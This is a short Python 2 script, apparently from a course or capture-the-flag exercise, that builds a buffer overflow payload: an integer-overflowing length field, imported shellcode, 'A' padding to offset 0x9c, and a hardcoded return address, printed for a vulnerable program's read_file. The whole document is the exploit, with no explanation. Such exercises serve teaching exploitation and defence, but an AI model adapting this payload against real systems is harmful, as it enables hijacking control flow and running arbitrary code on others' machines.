from struct import pack
from shellcode import shellcode

buffSize = (2**30)+25
offset = 0x9c
padSize = offset - len(shellcode)
padding = "A"*padSize
toReturn = 0xbffe7b80
#ebp at read_file - offSet + 4
print pack("<I", buffSize) + shellcode + padding + pack("<I", toReturn)
